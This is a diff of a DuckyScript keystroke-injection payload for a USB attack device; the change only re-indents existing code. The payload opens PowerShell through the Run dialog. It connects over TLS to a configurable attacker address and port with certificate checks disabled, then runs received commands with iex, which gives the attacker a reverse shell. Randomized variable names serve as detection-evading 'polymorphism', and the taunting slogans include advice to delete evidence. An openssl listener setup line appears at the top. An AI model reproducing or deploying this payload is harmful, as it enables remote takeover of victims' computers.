@@ -127,191 +127,191 @@ IF_DEFINED #SETUP
     STRINGLN openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes && echo "Setup complete! Starting listener on Port #PORT " && openssl s_server -quiet -key key.pem -cert cert.pem -port #PORT
 ELSE_DEFINED
 
-REM Pseudo random variables for layer one polymorphism
-VAR $var_gibberish = $_RANDOM_NUMBER_KEYCODE
-VAR $var_gibberish2 = $_RANDOM_LETTER_KEYCODE 
-VAR $var_gibberish3 = $_RANDOM_LOWER_LETTER_KEYCODE 
-VAR $var_gibberish4 = $_RANDOM_LETTER_KEYCODE
-VAR $var_gibb3rish = $_RANDOM_NUMBER_KEYCODE
-VAR $var_gIbberish5 = $_RANDOM_UPPER_LETTER_KEYCODE
-VAR $var_gibberish6 = $_RANDOM_NUMBER_KEYCODE
-VAR $var_gibBerish1 = $_RANDOM_NUMBER_KEYCODE
-
-REM Layer two polymorphism
-VAR $RANDOM_LAYER = $_RANDOM_INT
-
-REM Polymorphism function
-FUNCTION Polymorphism()
-    IF (($RANDOM_LAYER % 2) == 0) THEN
-        STRING $
-        INJECT_VAR $var_gibberish
-        INJECT_VAR $var_gibberish2
-        INJECT_VAR $var_gibberish3
-        INJECT_VAR $var_gibberish3
-        INJECT_VAR $var_gibberish4
-        INJECT_VAR $var_gIbberish5
-    ELSE IF (($RANDOM_LAYER % 6) == 0) THEN
-        STRING $
-        INJECT_VAR $var_gibberish
-        INJECT_VAR $var_gibberish2
-        INJECT_VAR $var_gibberish
-        INJECT_VAR $var_gibberish3
-        INJECT_VAR $var_gibberish4
-        INJECT_VAR $var_gibberish
-    ELSE
-        STRING $
-        INJECT_VAR $var_gibberish4
-        INJECT_VAR $var_gibberish
-        INJECT_VAR $var_gibberish2
-        INJECT_VAR $var_gibberish3
-        INJECT_VAR $var_gibberish
-        INJECT_VAR $var_gibberish4
-    END_IF
-END_FUNCTION
-
-REM Polymorphism function
-FUNCTION Polymorphism2()
-    IF (($RANDOM_LAYER % 6) == 0) THEN
-        STRING $
-        INJECT_VAR $var_gibberish
-        INJECT_VAR $var_gibberish2
-        INJECT_VAR $var_gibberish3
-        INJECT_VAR $var_gibberish3
-        INJECT_VAR $var_gibberish4
-        INJECT_VAR $var_gIbberish5
-        INJECT_VAR $var_gIbberish5
-    ELSE IF (($RANDOM_LAYER % 9) == 0) THEN
-        STRING $
-        INJECT_VAR $var_gibberish
-        INJECT_VAR $var_gIbberish5
-        INJECT_VAR $var_gibberish2
-        INJECT_VAR $var_gibberish
-        INJECT_VAR $var_gibberish3
-        INJECT_VAR $var_gibberish4
-        INJECT_VAR $var_gibberish
-    ELSE
-        STRING $
-        INJECT_VAR $var_gibberish4
-        INJECT_VAR $var_gibberish
-        INJECT_VAR $var_gibberish2
-        INJECT_VAR $var_gibberish3
-        INJECT_VAR $var_gibberish6
-        INJECT_VAR $var_gibberish4
-        INJECT_VAR $var_gIbberish5
-    END_IF
-END_FUNCTION
-
-REM Polymorphism function
-FUNCTION Polymorphism3()
-    IF (($RANDOM_LAYER % 1) == 0) THEN
-        STRING $
-        INJECT_VAR $var_gibberish
-        INJECT_VAR $var_gibberish2
-        INJECT_VAR $var_gIbberish5
-    ELSE IF (($RANDOM_LAYER % 8) == 0) THEN
-        STRING $
-        INJECT_VAR $var_gibberish
-        INJECT_VAR $var_gIbberish5
-        INJECT_VAR $var_gibberish
-    ELSE
-        STRING $
-        INJECT_VAR $var_gibberish4
-        INJECT_VAR $var_gibberish
-        INJECT_VAR $var_gIbberish5
-    END_IF
-END_FUNCTION
-
-REM Polymorphism function
-FUNCTION Polymorphism4()
-    IF (($RANDOM_LAYER % 1) == 0) THEN
-        STRING $
-        INJECT_VAR $var_gIbberish5
-        INJECT_VAR $var_gibberish
-        INJECT_VAR $var_gibberish2
-        INJECT_VAR $var_gibb3rish
-    ELSE IF (($RANDOM_LAYER % 8) == 0) THEN
-        STRING $
-        INJECT_VAR $var_gibBerish1
-        INJECT_VAR $var_gibberish
-        INJECT_VAR $var_gIbberish5
-        INJECT_VAR $var_gibberish
-    ELSE
-        STRING $
-        INJECT_VAR $var_gibberish6
-        INJECT_VAR $var_gibberish4
-        INJECT_VAR $var_gibberish
-        INJECT_VAR $var_gIbberish5
-    END_IF
-END_FUNCTION
-
-REM Connection Message
-FUNCTION Quack_Slogan()
-    IF (($RANDOM_LAYER % 2) == 0) THEN
-        STRING "[!] Quack you $env:USERNAME/$env:COMPUTERNAME! `n[?] Opsec Tip: Use environment variables.`n`n"
-    ELSE IF (($RANDOM_LAYER % 3) == 0) THEN
-        STRING "[!] $env:USERNAME/$env:COMPUTERNAME got found a flash drive... `n[?] Considere converting IPs to decimal (e.g. 127.0.0.1 = 2130706433)`n`n"
-    ELSE IF (($RANDOM_LAYER % 4) == 0) THEN
-        STRING "[!] $env:USERNAME/$env:COMPUTERNAME compromised by #IDENTIFIER `n[+] Ducks > D0lphins!`n`n"
-    ELSE IF (($RANDOM_LAYER % 6) == 0) THEN
-        STRING "[!] Quack Attack on $env:USERNAME/$env:COMPUTERNAME `n[+] Sometimes it is better to wait...Be patient!`n`n"
-    ELSE IF (($RANDOM_LAYER % 8) == 0) THEN
-        STRING "[!] Established remote access on $env:USERNAME/$env:COMPUTERNAME `n[?] Watch out for powershell -v 2!`n`n"
-    ELSE IF (($RANDOM_LAYER % 9) == 0) THEN
-        STRING "[!] $env:USERNAME/$env:COMPUTERNAME messed with the Duck `n[?] Remember to delete evidence.`n`n"
-    ELSE
-        STRING "[!] $env:USERNAME/$env:COMPUTERNAME says Quack! `n[+]...and then he waddled away...`n`n"
-    END_IF
-END_FUNCTION
-
-GUI r
-DELAY 500
-Rolling_Powershell_Execution()
-DELAY 300
-Polymorphism()    
-STRING =[Text.Encoding]::UTF8.GetBytes(
-Quack_Slogan()
-STRING );
-Polymorphism2()
-REM Section were Address & Port get reflected
-STRING =New-Object Net.Sockets.TcpClient( #ADDRESS , #PORT );
-STRING $s=
-Polymorphism2()
-STRING .GetStream();
-STRING $sSL=New-Object System.Net.Security.SslStream($s,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));
-STRING $sSL.AuthenticateAsClient('madeby.0iphor13', $null, "Tls12", $false);
-Polymorphism3()
-STRING =new-object System.IO.StreamWriter($sSL);
-STRING $sSL.write(
-Polymorphism()
-STRING ,0,
-Polymorphism()
-STRING .Length);
-Polymorphism3()
-STRING .Write('
-REM Identifier
-STRING #IDENTIFIER
-STRING @PS '+(&('g'+'l'))+'> ');
-Polymorphism3()
-STRING .flush();[byte[]]
-Polymorphism4() 
-STRING = 0..65535|%{0};while(($i=$sSL.Read(
-Polymorphism4()
-STRING , 0, 
-Polymorphism4()
-STRING .Length)) -ne 0){$D=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(
-Polymorphism4()
-STRING ,0, $i);
-STRING $Y=(iex $D | Out-String ) 2>&1;$X=$Y + '
-REM Identifier
-STRING #IDENTIFIER
-STRING @PS ' + (Get-LoCatIon).Path + '> ';
-STRING $Z=([text.encoding]::UTF8).GetBytes($X);$sSL.Write($Z,0,$Z.Length);
-STRING $sSL.Flush()};exit
-DELAY 250
-ENTER
-REM Indicator of successful execution
-CAPSLOCK
-DELAY 20
-CAPSLOCK
+    REM Pseudo random variables for layer one polymorphism
+    VAR $var_gibberish = $_RANDOM_NUMBER_KEYCODE
+    VAR $var_gibberish2 = $_RANDOM_LETTER_KEYCODE 
+    VAR $var_gibberish3 = $_RANDOM_LOWER_LETTER_KEYCODE 
+    VAR $var_gibberish4 = $_RANDOM_LETTER_KEYCODE
+    VAR $var_gibb3rish = $_RANDOM_NUMBER_KEYCODE
+    VAR $var_gIbberish5 = $_RANDOM_UPPER_LETTER_KEYCODE
+    VAR $var_gibberish6 = $_RANDOM_NUMBER_KEYCODE
+    VAR $var_gibBerish1 = $_RANDOM_NUMBER_KEYCODE
+    
+    REM Layer two polymorphism
+    VAR $RANDOM_LAYER = $_RANDOM_INT
+    
+    REM Polymorphism function
+    FUNCTION Polymorphism()
+        IF (($RANDOM_LAYER % 2) == 0) THEN
+            STRING $
+            INJECT_VAR $var_gibberish
+            INJECT_VAR $var_gibberish2
+            INJECT_VAR $var_gibberish3
+            INJECT_VAR $var_gibberish3
+            INJECT_VAR $var_gibberish4
+            INJECT_VAR $var_gIbberish5
+        ELSE IF (($RANDOM_LAYER % 6) == 0) THEN
+            STRING $
+            INJECT_VAR $var_gibberish
+            INJECT_VAR $var_gibberish2
+            INJECT_VAR $var_gibberish
+            INJECT_VAR $var_gibberish3
+            INJECT_VAR $var_gibberish4
+            INJECT_VAR $var_gibberish
+        ELSE
+            STRING $
+            INJECT_VAR $var_gibberish4
+            INJECT_VAR $var_gibberish
+            INJECT_VAR $var_gibberish2
+            INJECT_VAR $var_gibberish3
+            INJECT_VAR $var_gibberish
+            INJECT_VAR $var_gibberish4
+        END_IF
+    END_FUNCTION
+    
+    REM Polymorphism function
+    FUNCTION Polymorphism2()
+        IF (($RANDOM_LAYER % 6) == 0) THEN
+            STRING $
+            INJECT_VAR $var_gibberish
+            INJECT_VAR $var_gibberish2
+            INJECT_VAR $var_gibberish3
+            INJECT_VAR $var_gibberish3
+            INJECT_VAR $var_gibberish4
+            INJECT_VAR $var_gIbberish5
+            INJECT_VAR $var_gIbberish5
+        ELSE IF (($RANDOM_LAYER % 9) == 0) THEN
+            STRING $
+            INJECT_VAR $var_gibberish
+            INJECT_VAR $var_gIbberish5
+            INJECT_VAR $var_gibberish2
+            INJECT_VAR $var_gibberish
+            INJECT_VAR $var_gibberish3
+            INJECT_VAR $var_gibberish4
+            INJECT_VAR $var_gibberish
+        ELSE
+            STRING $
+            INJECT_VAR $var_gibberish4
+            INJECT_VAR $var_gibberish
+            INJECT_VAR $var_gibberish2
+            INJECT_VAR $var_gibberish3
+            INJECT_VAR $var_gibberish6
+            INJECT_VAR $var_gibberish4
+            INJECT_VAR $var_gIbberish5
+        END_IF
+    END_FUNCTION
+    
+    REM Polymorphism function
+    FUNCTION Polymorphism3()
+        IF (($RANDOM_LAYER % 1) == 0) THEN
+            STRING $
+            INJECT_VAR $var_gibberish
+            INJECT_VAR $var_gibberish2
+            INJECT_VAR $var_gIbberish5
+        ELSE IF (($RANDOM_LAYER % 8) == 0) THEN
+            STRING $
+            INJECT_VAR $var_gibberish
+            INJECT_VAR $var_gIbberish5
+            INJECT_VAR $var_gibberish
+        ELSE
+            STRING $
+            INJECT_VAR $var_gibberish4
+            INJECT_VAR $var_gibberish
+            INJECT_VAR $var_gIbberish5
+        END_IF
+    END_FUNCTION
+    
+    REM Polymorphism function
+    FUNCTION Polymorphism4()
+        IF (($RANDOM_LAYER % 1) == 0) THEN
+            STRING $
+            INJECT_VAR $var_gIbberish5
+            INJECT_VAR $var_gibberish
+            INJECT_VAR $var_gibberish2
+            INJECT_VAR $var_gibb3rish
+        ELSE IF (($RANDOM_LAYER % 8) == 0) THEN
+            STRING $
+            INJECT_VAR $var_gibBerish1
+            INJECT_VAR $var_gibberish
+            INJECT_VAR $var_gIbberish5
+            INJECT_VAR $var_gibberish
+        ELSE
+            STRING $
+            INJECT_VAR $var_gibberish6
+            INJECT_VAR $var_gibberish4
+            INJECT_VAR $var_gibberish
+            INJECT_VAR $var_gIbberish5
+        END_IF
+    END_FUNCTION
+    
+    REM Connection Message
+    FUNCTION Quack_Slogan()
+        IF (($RANDOM_LAYER % 2) == 0) THEN
+            STRING "[!] Quack you $env:USERNAME/$env:COMPUTERNAME! `n[?] Opsec Tip: Use environment variables.`n`n"
+        ELSE IF (($RANDOM_LAYER % 3) == 0) THEN
+            STRING "[!] $env:USERNAME/$env:COMPUTERNAME got found a flash drive... `n[?] Considere converting IPs to decimal (e.g. 127.0.0.1 = 2130706433)`n`n"
+        ELSE IF (($RANDOM_LAYER % 4) == 0) THEN
+            STRING "[!] $env:USERNAME/$env:COMPUTERNAME compromised by #IDENTIFIER `n[+] Ducks > D0lphins!`n`n"
+        ELSE IF (($RANDOM_LAYER % 6) == 0) THEN
+            STRING "[!] Quack Attack on $env:USERNAME/$env:COMPUTERNAME `n[+] Sometimes it is better to wait...Be patient!`n`n"
+        ELSE IF (($RANDOM_LAYER % 8) == 0) THEN
+            STRING "[!] Established remote access on $env:USERNAME/$env:COMPUTERNAME `n[?] Watch out for powershell -v 2!`n`n"
+        ELSE IF (($RANDOM_LAYER % 9) == 0) THEN
+            STRING "[!] $env:USERNAME/$env:COMPUTERNAME messed with the Duck `n[?] Remember to delete evidence.`n`n"
+        ELSE
+            STRING "[!] $env:USERNAME/$env:COMPUTERNAME says Quack! `n[+]...and then he waddled away...`n`n"
+        END_IF
+    END_FUNCTION
+    
+    GUI r
+    DELAY 500
+    Rolling_Powershell_Execution()
+    DELAY 300
+    Polymorphism()    
+    STRING =[Text.Encoding]::UTF8.GetBytes(
+    Quack_Slogan()
+    STRING );
+    Polymorphism2()
+    REM Section were Address & Port get reflected
+    STRING =New-Object Net.Sockets.TcpClient( #ADDRESS , #PORT );
+    STRING $s=
+    Polymorphism2()
+    STRING .GetStream();
+    STRING $sSL=New-Object System.Net.Security.SslStream($s,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));
+    STRING $sSL.AuthenticateAsClient('madeby.0iphor13', $null, "Tls12", $false);
+    Polymorphism3()
+    STRING =new-object System.IO.StreamWriter($sSL);
+    STRING $sSL.write(
+    Polymorphism()
+    STRING ,0,
+    Polymorphism()
+    STRING .Length);
+    Polymorphism3()
+    STRING .Write('
+    REM Identifier
+    STRING #IDENTIFIER
+    STRING @PS '+(&('g'+'l'))+'> ');
+    Polymorphism3()
+    STRING .flush();[byte[]]
+    Polymorphism4() 
+    STRING = 0..65535|%{0};while(($i=$sSL.Read(
+    Polymorphism4()
+    STRING , 0, 
+    Polymorphism4()
+    STRING .Length)) -ne 0){$D=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(
+    Polymorphism4()
+    STRING ,0, $i);
+    STRING $Y=(iex $D | Out-String ) 2>&1;$X=$Y + '
+    REM Identifier
+    STRING #IDENTIFIER
+    STRING @PS ' + (Get-LoCatIon).Path + '> ';
+    STRING $Z=([text.encoding]::UTF8).GetBytes($X);$sSL.Write($Z,0,$Z.Length);
+    STRING $sSL.Flush()};exit
+    DELAY 250
+    ENTER
+    REM Indicator of successful execution
+    CAPSLOCK
+    DELAY 20
+    CAPSLOCK
 END_IF_DEFINED
 
